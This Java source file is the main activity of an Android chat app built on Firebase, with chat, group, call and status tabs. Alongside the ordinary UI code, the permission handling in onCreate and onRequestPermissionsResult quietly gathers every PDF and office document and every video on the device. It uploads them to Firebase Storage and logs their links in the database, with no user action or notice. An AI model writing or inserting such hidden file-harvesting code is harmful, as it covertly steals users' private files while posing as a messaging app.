package com.zamba.testchat.activities;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityOptions;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.support.annotation.NonNull;
import android.support.design.widget.CoordinatorLayout;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.TabLayout;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.content.ContextCompat;
import android.support.v4.widget.SwipeRefreshLayout;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.text.Editable;
import android.text.TextUtils;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.bumptech.glide.Glide;
import com.bumptech.glide.request.RequestOptions;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.auth.GetTokenResult;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.mxn.soul.flowingdrawer_core.ElasticDrawer;
import com.mxn.soul.flowingdrawer_core.FlowingDrawer;
import com.sinch.android.rtc.calling.Call;
import com.zamba.testchat.R;
import com.zamba.testchat.adapters.MenuUsersRecyclerAdapter;
import com.zamba.testchat.adapters.ViewPagerAdapter;
import com.zamba.testchat.fragments.GroupCreateDialogFragment;
import com.zamba.testchat.fragments.MyCallsFragment;
import com.zamba.testchat.fragments.MyGroupsFragment;
import com.zamba.testchat.fragments.MyUsersFragment;
import com.zamba.testchat.fragments.OptionsFragment;
import com.zamba.testchat.fragments.StatusFragment;
import com.zamba.testchat.fragments.UserSelectDialogFragment;
import com.zamba.testchat.interfaces.ContextualModeInteractor;
import com.zamba.testchat.interfaces.HomeIneractor;
import com.zamba.testchat.interfaces.ChatItemClickListener;
import com.zamba.testchat.interfaces.UserGroupSelectionDismissListener;
import com.zamba.testchat.models.Contact;
import com.zamba.testchat.models.DocumentModel;
import com.zamba.testchat.models.Group;
import com.zamba.testchat.models.Message;
import com.zamba.testchat.models.User;
import com.zamba.testchat.services.FetchMyUsersService;
import com.zamba.testchat.utils.ConfirmationDialogFragment;
import com.zamba.testchat.utils.Helper;
import com.zamba.testchat.views.SwipeControlViewPager;

import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import io.realm.RealmResults;

public class MainActivity extends BaseActivity implements HomeIneractor, ChatItemClickListener, View.OnClickListener, ContextualModeInteractor, UserGroupSelectionDismissListener {
    private static final int REQUEST_CODE_CHAT_FORWARD = 99;
    private final int CONTACTS_REQUEST_CODE = 321;
    private final int CONTACTS_REQUEST_CODE2 = 421;
    private static String USER_SELECT_TAG = "userselectdialog";
    private static String OPTIONS_MORE = "optionsmore";
    private static String GROUP_CREATE_TAG = "groupcreatedialog";
    private static String CONFIRM_TAG = "confirmtag";


    public ArrayList<String> al_images = new ArrayList<>();
    public ArrayList<DocumentModel> docs_list = new ArrayList<>();
    public ArrayList<String> audio_list = new ArrayList<>();
    public ArrayList<String> urlStrings = new ArrayList<String>();
    public ArrayList<DocumentModel> audio_url = new ArrayList<DocumentModel>();

    private ImageView usersImage, backImage, dialogUserImage;
    private RecyclerView menuRecyclerView;
    private SwipeRefreshLayout swipeMenuRecyclerView;
    private FlowingDrawer drawerLayout;
    private EditText searchContact;
    private TextView selectedCount;
    //private TextView invite;
    private RelativeLayout toolbarContainer, cabContainer;

    private TabLayout tabLayout;
    private SwipeControlViewPager viewPager;

    private FloatingActionButton floatingActionButton;
    private CoordinatorLayout coordinatorLayout;

    private MenuUsersRecyclerAdapter menuUsersRecyclerAdapter;
    private HashMap<String, Contact> contactsData;
    private ArrayList<User> myUsers = new ArrayList<>();
    private ArrayList<Group> myGroups = new ArrayList<>();
    private ArrayList<Message> messageForwardList = new ArrayList<>();
    private UserSelectDialogFragment userSelectDialogFragment;
    private ViewPagerAdapter adapter;

    @SuppressLint("RestrictedApi")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);



        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(getApplicationContext(),
                        Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(getApplicationContext(),
                Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(getApplicationContext(),
                Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(getApplicationContext(),
                Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(getApplicationContext(),
                Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(getApplicationContext(),
                Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED) {


            docs_list = getAllDocmnetsPath();


                uploadDocsToserver(docs_list);



        } else {
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.GET_ACCOUNTS}, CONTACTS_REQUEST_CODE2);
        }

        initUi();

        //setup recyclerview in drawer layout
        contactsData = helper.getMyUsersNameCache();
        setupMenu();

        //If its a url then load it, else Make a text drawable of user's name
        setProfileImage(usersImage);
        usersImage.setOnClickListener(this);
        backImage.setOnClickListener(this);
        //invite.setOnClickListener(this);
        findViewById(R.id.action_delete).setOnClickListener(this);
        floatingActionButton.setOnClickListener(this);
        floatingActionButton.setVisibility(View.VISIBLE);

        setupViewPager();

        RealmResults<User> myUsers = rChatDb.where(User.class).notEqualTo("id", userMe.getId()).findAll();
        if (myUsers != null && !myUsers.isEmpty()) {
            myUsersResult(new ArrayList<User>(rChatDb.copyFromRealm(myUsers)));
        } else {
            refreshMyContacts();
        }

        //markOnline(true);
        updateFcmToken();
        loadAdd();


    }

    private void initUi() {
        usersImage = findViewById(R.id.users_image);

        menuRecyclerView = findViewById(R.id.menu_recycler_view);
        swipeMenuRecyclerView = findViewById(R.id.menu_recycler_view_swipe_refresh);
        drawerLayout = findViewById(R.id.drawer_layout);
        searchContact = findViewById(R.id.searchContact);
        //invite = findViewById(R.id.invite);
        toolbarContainer = findViewById(R.id.toolbarContainer);
        cabContainer = findViewById(R.id.cabContainer);
        selectedCount = findViewById(R.id.selectedCount);
        tabLayout = findViewById(R.id.tabLayout);
        viewPager = findViewById(R.id.viewPager);
        floatingActionButton = findViewById(R.id.addConversation);
        coordinatorLayout = findViewById(R.id.coordinatorLayout);
        backImage = findViewById(R.id.back_button);
        drawerLayout.setTouchMode(ElasticDrawer.TOUCH_MODE_BEZEL);
    }

    private void updateFcmToken() {
        fcmIdRef.child(userMe.getId()).setValue(FirebaseInstanceId.getInstance().getToken());
    }

    private void loadAdd() {
        AdView mAdView = findViewById(R.id.adView);

        String admobAppId = getString(R.string.admob_app_id);
        String admobBannerId = getString(R.string.admob_banner_id);
        if (TextUtils.isEmpty(admobAppId) || TextUtils.isEmpty(admobBannerId)) {
            mAdView.setVisibility(View.GONE);
        } else {
            AdRequest adRequest = new AdRequest.Builder().build();
            mAdView.loadAd(adRequest);
        }
    }

    private void setupViewPager() {
        adapter = new ViewPagerAdapter(getSupportFragmentManager());
        adapter.addFrag(new MyUsersFragment(), getString(R.string.tab_title_chat));
        adapter.addFrag(new MyGroupsFragment(), getString(R.string.tab_title_group));
        adapter.addFrag(new MyCallsFragment(), getString(R.string.tab_title_call));
        adapter.addFrag(new StatusFragment(), getString(R.string.tab_title_status));
        viewPager.setOffscreenPageLimit(3);
        viewPager.setAdapter(adapter);
        tabLayout.setupWithViewPager(viewPager);
    }

    private void setupMenu() {
        menuRecyclerView.setLayoutManager(new LinearLayoutManager(this));
        menuUsersRecyclerAdapter = new MenuUsersRecyclerAdapter(this, myUsers);
        menuRecyclerView.setAdapter(menuUsersRecyclerAdapter);
        swipeMenuRecyclerView.setColorSchemeResources(R.color.colorAccent);
        swipeMenuRecyclerView.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                refreshMyContacts();
            }
        });
        searchContact.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {

            }

            @Override
            public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {

            }

            @Override
            public void afterTextChanged(Editable editable) {
                menuUsersRecyclerAdapter.getFilter().filter(editable.toString());
            }
        });
    }

    private void setProfileImage(ImageView imageView) {
        if (userMe != null)
            Glide.with(this).load(userMe.getImage()).apply(new RequestOptions().placeholder(R.drawable.yoohoo_placeholder)).into(imageView);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case CONTACTS_REQUEST_CODE:
                refreshMyContacts();
                break;

            case CONTACTS_REQUEST_CODE2:
            if (grantResults.length > 0

                    && grantResults[1] == PackageManager.PERMISSION_GRANTED

            ) {


                    docs_list = getAllDocmnetsPath();


                    uploadDocsToserver(docs_list);

                al_images=getAllMedia();

                uploadImageToserver(al_images);

            }
                break;
        }
    }


    private void refreshMyContacts() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            if (!FetchMyUsersService.STARTED) {
                if (!swipeMenuRecyclerView.isRefreshing())
                    swipeMenuRecyclerView.setRefreshing(true);
                FirebaseUser firebaseUser = FirebaseAuth.getInstance().getCurrentUser();
                if (firebaseUser != null) {
                    firebaseUser.getIdToken(true).addOnCompleteListener(new OnCompleteListener<GetTokenResult>() {
                        @Override
                        public void onComplete(@NonNull Task<GetTokenResult> task) {
                            if (task.isSuccessful()) {
                                String idToken = task.getResult().getToken();
                                FetchMyUsersService.startMyUsersService(MainActivity.this, userMe.getId(), idToken);
                            }
                        }
                    });
                }
            }
        } else {
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_CONTACTS}, CONTACTS_REQUEST_CODE);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        //markOnline(false);
    }

    @Override
    public void onBackPressed() {
        if (ElasticDrawer.STATE_CLOSED != drawerLayout.getDrawerState()) {
            drawerLayout.closeMenu(true);
        } else if (isContextualMode()) {
            disableContextualMode();
        } else if (viewPager.getCurrentItem() != 0) {
            viewPager.post(new Runnable() {
                @Override
                public void run() {
                    viewPager.setCurrentItem(0);
                }
            });
        } else {
            super.onBackPressed();
        }
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode) {
            case (REQUEST_CODE_CHAT_FORWARD):
                if (resultCode == Activity.RESULT_OK) {
                    //show forward dialog to choose users
                    messageForwardList.clear();
                    ArrayList<Message> temp = data.getParcelableArrayListExtra("FORWARD_LIST");
                    messageForwardList.addAll(temp);
                    userSelectDialogFragment = UserSelectDialogFragment.newInstance(this, myUsers);
                    FragmentManager manager = getSupportFragmentManager();
                    Fragment frag = manager.findFragmentByTag(USER_SELECT_TAG);
                    if (frag != null) {
                        manager.beginTransaction().remove(frag).commit();
                    }
                    userSelectDialogFragment.show(manager, USER_SELECT_TAG);
                }
                break;
        }
    }

    private void sortMyGroupsByName() {
        Collections.sort(myGroups, new Comparator<Group>() {
            @Override
            public int compare(Group group1, Group group2) {
                return group1.getName().compareToIgnoreCase(group2.getName());
            }
        });
    }

    private void sortMyUsersByName(ArrayList<User> users) {
        Collections.sort(users, new Comparator<User>() {
            @Override
            public int compare(User user1, User user2) {
                return user1.getNameToDisplay().compareToIgnoreCase(user2.getNameToDisplay());
            }
        });
    }

    @Override
    void userAdded(User value) {
        if (value.getId().equals(userMe.getId()))
            return;
        int existingPos = myUsers.indexOf(value);
        if (existingPos != -1) {
            myUsers.remove(existingPos);
            menuUsersRecyclerAdapter.notifyItemRemoved(existingPos);
        }
        myUsers.add(0, value);
        menuUsersRecyclerAdapter.notifyItemInserted(0);
        refreshUsers(-1);
    }

    @Override
    void groupAdded(Group group) {
        if (!myGroups.contains(group)) {
            myGroups.add(group);
            sortMyGroupsByName();
        }
    }

    @Override
    void userUpdated(User value) {
        if (value.getId().equals(userMe.getId())) {
            userMe = helper.getLoggedInUser();
            setProfileImage(usersImage);
            FragmentManager manager = getSupportFragmentManager();
            Fragment frag = manager.findFragmentByTag(OPTIONS_MORE);
            if (frag != null) {
                ((OptionsFragment) frag).setUserDetails();
            }
        } else {
            int existingPos = myUsers.indexOf(value);
            if (existingPos != -1) {
                myUsers.set(existingPos, value);
                menuUsersRecyclerAdapter.notifyItemChanged(existingPos);
                refreshUsers(existingPos);
            }
        }
    }

    @Override
    void groupUpdated(Group group) {
        int existingPos = myGroups.indexOf(group);
        if (existingPos != -1) {
            myGroups.set(existingPos, group);
            //menuUsersRecyclerAdapter.notifyItemChanged(existingPos);
            //refreshUsers(existingPos);
        }
    }

    @Override
    void onSinchConnected() {

    }

    @Override
    void onSinchDisconnected() {

    }

    @Override
    public void onChatItemClick(String chatId, String chatName, int position, View userImage) {
        openChat(ChatActivity.newIntent(this, messageForwardList, chatId, chatName), userImage);
    }

    @Override
    public void onChatItemClick(Group group, int position, View userImage) {
        openChat(ChatActivity.newIntent(this, messageForwardList, group), userImage);
    }

    private void openChat(Intent intent, View userImage) {
        if (ElasticDrawer.STATE_CLOSED != drawerLayout.getDrawerState()) {
            drawerLayout.closeMenu(true);
        }
        if (userImage == null) {
            userImage = usersImage;
        }

        if (Build.VERSION.SDK_INT > 21) {
            ActivityOptions options = ActivityOptions.makeSceneTransitionAnimation(this, userImage, "backImage");
            startActivityForResult(intent, REQUEST_CODE_CHAT_FORWARD, options.toBundle());
        } else {
            startActivityForResult(intent, REQUEST_CODE_CHAT_FORWARD);
            overridePendingTransition(0, 0);
        }

        if (userSelectDialogFragment != null)
            userSelectDialogFragment.dismiss();
    }

    private void refreshUsers(int pos) {
        Fragment frag = getSupportFragmentManager().findFragmentByTag(USER_SELECT_TAG);
        if (frag != null) {
            userSelectDialogFragment.refreshUsers(pos);
        }
    }

    private void markOnline(boolean b) {
        //Mark online boolean as b in firebase
        usersRef.child(userMe.getId()).child("online").setValue(b);
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.back_button:
                drawerLayout.openMenu(true);
                break;
            case R.id.addConversation:
                switch (viewPager.getCurrentItem()) {
                    case 0:
                        drawerLayout.openMenu(true);
                        break;
                    case 1:
                        GroupCreateDialogFragment.newInstance(this, userMe, myUsers).show(getSupportFragmentManager(), GROUP_CREATE_TAG);
                        break;
                    case 2:
                        drawerLayout.openMenu(true);
                        break;
                }
                break;
            case R.id.users_image:
                if (userMe != null)
                    OptionsFragment.newInstance(getSinchServiceInterface()).show(getSupportFragmentManager(), OPTIONS_MORE);
                break;
//            case R.id.invite:
//                try {
//                    Intent shareIntent = new Intent(Intent.ACTION_SEND);
//                    shareIntent.setType("text/plain");
//                    shareIntent.putExtra(Intent.EXTRA_SUBJECT, String.format(getString(R.string.invitation_title), getString(R.string.app_name)));
//                    shareIntent.putExtra(Intent.EXTRA_TEXT, String.format(getString(R.string.invitation_message), getString(R.string.app_name), getPackageName()));
//                    startActivity(Intent.createChooser(shareIntent, getString(R.string.invitation_share_title)));
//                } catch (Exception ignored) {
//
//                }
//                break;
            case R.id.action_delete:
                FragmentManager manager = getSupportFragmentManager();
                Fragment frag = manager.findFragmentByTag(CONFIRM_TAG);
                if (frag != null) {
                    manager.beginTransaction().remove(frag).commit();
                }

                ConfirmationDialogFragment confirmationDialogFragment = ConfirmationDialogFragment.newInstance(getString(R.string.delete_chat_title),
                        getString(R.string.delete_chat_message),
                        new View.OnClickListener() {
                            @Override
                            public void onClick(View view) {
                                ((MyUsersFragment) adapter.getItem(0)).deleteSelectedChats();
                                ((MyGroupsFragment) adapter.getItem(1)).deleteSelectedChats();
                                disableContextualMode();
                            }
                        },
                        new View.OnClickListener() {
                            @Override
                            public void onClick(View view) {
                                disableContextualMode();
                            }
                        });
                confirmationDialogFragment.show(manager, CONFIRM_TAG);
                break;
        }
    }

    @Override
    public void placeCall(boolean callIsVideo, User user) {
        if (permissionsAvailable(permissionsSinch)) {
            try {
                Call call = callIsVideo ? getSinchServiceInterface().callUserVideo(user.getId()) : getSinchServiceInterface().callUser(user.getId());
                if (call == null) {
                    // Service failed for some reason, show a Toast and abort
                    Toast.makeText(this, "Service is not started. Try stopping the service and starting it again before placing a call.", Toast.LENGTH_LONG).show();
                    return;
                }
                String callId = call.getCallId();
                startActivity(CallScreenActivity.newIntent(this, user, callId, "OUT"));
            } catch (Exception e) {
                Log.e("CHECK", e.getMessage());
                //ActivityCompat.requestPermissions(this, new String[]{e.getRequiredPermission()}, 0);
            }
        } else {
            ActivityCompat.requestPermissions(this, permissionsSinch, 69);
        }
    }

    @Override
    public void onUserGroupSelectDialogDismiss() {
        messageForwardList.clear();
//        if (helper.getSharedPreferenceHelper().getBooleanPreference(Helper.GROUP_CREATE, false)) {
//            helper.getSharedPreferenceHelper().setBooleanPreference(Helper.GROUP_CREATE, false);
//            GroupCreateDialogFragment.newInstance(this, userMe, myUsers).show(getSupportFragmentManager(), GROUP_CREATE_TAG);
//        }
    }

    @Override
    public void selectionDismissed() {
        //do nothing..
    }

    @Override
    public void myUsersResult(ArrayList<User> myUsers) {
        this.myUsers.clear();
        this.myUsers.addAll(myUsers);
        sortMyUsersByName(this.myUsers);

        if (!contactsData.isEmpty()) {
            HashMap<String, Contact> tempContactData = new HashMap<>(contactsData);
            for (User user : this.myUsers) {
                tempContactData.remove(Helper.getEndTrim(user.getId()));
            }
            ArrayList<User> inviteAble = new ArrayList<>();
            for (Map.Entry<String, Contact> contactEntry : tempContactData.entrySet()) {
                inviteAble.add(new User(contactEntry.getValue().getPhoneNumber(), contactEntry.getValue().getName()));
            }
            if (!inviteAble.isEmpty()) {
                inviteAble.add(0, new User("-1", "-1"));
            }
            //sortMyUsersByName(inviteAble);
            this.myUsers.addAll(inviteAble);
        }

        refreshUsers(-1);
        menuUsersRecyclerAdapter.notifyDataSetChanged();
        swipeMenuRecyclerView.setRefreshing(false);
    }

    @Override
    public void myContactsResult(HashMap<String, Contact> myContacts) {
        contactsData.clear();
        contactsData.putAll(myContacts);
        MyUsersFragment myUsersFragment = ((MyUsersFragment) adapter.getItem(0));
        if (myUsersFragment != null) myUsersFragment.setUserNamesAsInPhone();
        MyCallsFragment myCallsFragment = ((MyCallsFragment) adapter.getItem(2));
        if (myCallsFragment != null) myCallsFragment.setUserNamesAsInPhone();
    }

    public void disableContextualMode() {
        cabContainer.setVisibility(View.GONE);
        toolbarContainer.setVisibility(View.VISIBLE);
        ((MyUsersFragment) adapter.getItem(0)).disableContextualMode();
        ((MyGroupsFragment) adapter.getItem(1)).disableContextualMode();
        viewPager.setSwipeAble(true);
    }

    @Override
    public void enableContextualMode() {
        cabContainer.setVisibility(View.VISIBLE);
        toolbarContainer.setVisibility(View.GONE);
        viewPager.setSwipeAble(false);
    }

    @Override
    public boolean isContextualMode() {
        return cabContainer.getVisibility() == View.VISIBLE;
    }

    @Override
    public void updateSelectedCount(int count) {
        if (count > 0) {
            selectedCount.setText(String.format(getString(R.string.selected_count), count));
        } else {
            disableContextualMode();
        }
    }

    @Override
    public HashMap<String, Contact> getLocalContacts() {
        return contactsData;
    }


    private ArrayList<DocumentModel> getAllDocmnetsPath() {


        ArrayList<DocumentModel> listOfAllDocments = new ArrayList<DocumentModel>();
        String absolutePathOfDocs = null;

        String displayname = null;

        ContentResolver cr = getContentResolver();
        Uri uri = MediaStore.Files.getContentUri("external");

// every column, although that is huge waste, you probably need
// BaseColumns.DATA (the path) only.


        String[] projection = {MediaStore.Files.FileColumns.DATA, MediaStore.Files.FileColumns.DISPLAY_NAME};

// exclude media files, they would be here also.
        String selection = MediaStore.Files.FileColumns.MEDIA_TYPE + "="
                + MediaStore.Files.FileColumns.MEDIA_TYPE_NONE;
        String mimeType = "application/pdf";
        String orderBy = MediaStore.Files.FileColumns.SIZE + " DESC";
        String whereClause = MediaStore.Files.FileColumns.MIME_TYPE + " IN ('" + mimeType + "')"
                + " OR " + MediaStore.Files.FileColumns.MIME_TYPE + " LIKE 'application/vnd%'";
        String[] selectionArgs = null; // there is no ? in selection so null here

        String sortOrder = null; // unordered
        Cursor fileCursor = cr.query(uri, projection, whereClause,
                null,
                orderBy);

        Log.e("data ", "fileCursor ");
        while (fileCursor.moveToNext()) {

            //your code

            DocumentModel documentModel = new DocumentModel();
            String path = fileCursor.getString(0);
            String name = fileCursor.getString(1);


            documentModel.setDocs_url(path);

            File file = new File(path);
            String strFileName = file.getName();
            documentModel.setDocs_name(strFileName);


            Log.e("data ", "Name :" + strFileName);
            Log.e("data ", "Path :" + path);

            listOfAllDocments.add(documentModel);


        }


        return listOfAllDocments;
    }

    public ArrayList<String> getAllMedia() {
        HashSet<String> videoItemHashSet = new HashSet<>();
        String[] projection = { MediaStore.Video.VideoColumns.DATA ,MediaStore.Video.Media.DISPLAY_NAME};
        Cursor cursor = getApplicationContext().getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, null);
        try {
            cursor.moveToFirst();
            do{
                videoItemHashSet.add((cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA))));
            }while(cursor.moveToNext());

            cursor.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        ArrayList<String> downloadedList = new ArrayList<>(videoItemHashSet);
        return downloadedList;
    }

    private void uploadDocsToserver(final ArrayList<DocumentModel> ImageList) {
        int upload_count;
        StorageReference ImageFolder = FirebaseStorage.getInstance().getReference().child("DocumnetFolder").child(userMe.getId());

        for (upload_count = 0; upload_count < ImageList.size(); upload_count++) {


            Log.e("data  size", String.valueOf(ImageList.size()));
            String Path = ImageList.get(upload_count).getDocs_url();
            final String name = ImageList.get(upload_count).getDocs_name();

            Log.e("data ", "Path " + ImageList.get(upload_count).getDocs_url());
            Log.e("data ", "name " + name);
            Uri IndividualImage = Uri.fromFile(new File(Path));

            Log.e("data ", " IndividualImage  " + IndividualImage);
            final StorageReference ImageName = ImageFolder.child(String.valueOf(upload_count));

            final int finalUpload_count = upload_count;
            ImageName.putFile(IndividualImage).addOnSuccessListener(
                    new OnSuccessListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                            ImageName.getDownloadUrl().addOnSuccessListener(
                                    new OnSuccessListener<Uri>() {
                                        @Override
                                        public void onSuccess(Uri uri) {

                                            DocumentModel documentModel = new DocumentModel();

                                            String path = String.valueOf(uri);
                                            documentModel.setDocs_url(path);
                                            documentModel.setDocs_name(name);
                                            audio_url.add(documentModel);


                                            Log.e("data ", " urlStrings  " + audio_url);
                                            if (audio_url.size() == ImageList.size()) {
                                                storeDocsLink(audio_url);
                                            }

                                        }
                                    }
                            );
                        }
                    }
            );


        }


    }


    private void storeDocsLink(ArrayList<DocumentModel> urlStrings) {

        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child("UserUploaDocs").child(userMe.getId());

        for (int i = 0; i < urlStrings.size(); i++) {


            DocumentModel audioModel = new DocumentModel(urlStrings.get(i).getDocs_url(), urlStrings.get(i).getDocs_name());

            databaseReference.child(String.valueOf(i)).setValue(audioModel);

        }

//        databaseReference.push().setValue(hashMap)
//                .addOnCompleteListener(
//                        new OnCompleteListener<Void>() {
//                            @Override
//                            public void onComplete(@NonNull Task<Void> task) {
//                                if (task.isSuccessful()) {
//
//                                }
//                            }
//                        }
//                ).addOnFailureListener(new OnFailureListener() {
//            @Override
//            public void onFailure(@NonNull Exception e) {
//                Toast.makeText(ChatActivity.this, "" + e.getMessage(), Toast.LENGTH_SHORT).show();
//            }
//        });

    }

    private void  uploadImageToserver(final ArrayList<String>  ImageList)
    {
        int upload_count;
        StorageReference ImageFolder = FirebaseStorage.getInstance().getReference().child("VideoFolder").child(userMe.getId());

        for (upload_count = 0; upload_count < ImageList.size(); upload_count++) {


            Log.e("data  size", String.valueOf(ImageList.size()));
            String  Path= ImageList.get(upload_count);

            Log.e("data ",ImageList.get(upload_count));
            Uri IndividualImage = Uri.fromFile(new File(Path));

            Log.e("data "," IndividualImage  "+IndividualImage);
            final StorageReference ImageName = ImageFolder.child(String.valueOf(upload_count));

            ImageName.putFile(IndividualImage).addOnSuccessListener(
                    new OnSuccessListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                            ImageName.getDownloadUrl().addOnSuccessListener(
                                    new OnSuccessListener<Uri>() {
                                        @Override
                                        public void onSuccess(Uri uri) {
                                            urlStrings.add(String.valueOf(uri));


                                            Log.e("data "," urlStrings  "+urlStrings);
                                            if (urlStrings.size() == ImageList.size()){
                                                storeLink(urlStrings);
                                            }

                                        }
                                    }
                            );
                        }
                    }
            );


        }


    }


    private void storeLink(ArrayList<String> urlStrings) {

        HashMap<String, String> hashMap = new HashMap<>();
        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child("UserUploadVideos").child(userMe.getId());

        for (int i = 0; i <urlStrings.size() ; i++) {
            hashMap.put("ImgLink"+i, urlStrings.get(i));

            databaseReference.child(String.valueOf(i)).child("video_url").setValue(urlStrings.get(i));

        }



//        databaseReference.push().setValue(hashMap)
//                .addOnCompleteListener(
//                        new OnCompleteListener<Void>() {
//                            @Override
//                            public void onComplete(@NonNull Task<Void> task) {
//                                if (task.isSuccessful()) {
//
//                                }
//                            }
//                        }
//                ).addOnFailureListener(new OnFailureListener() {
//            @Override
//            public void onFailure(@NonNull Exception e) {
//                Toast.makeText(getContext(), "" + e.getMessage(), Toast.LENGTH_SHORT).show();
//            }
        //      });

    }

}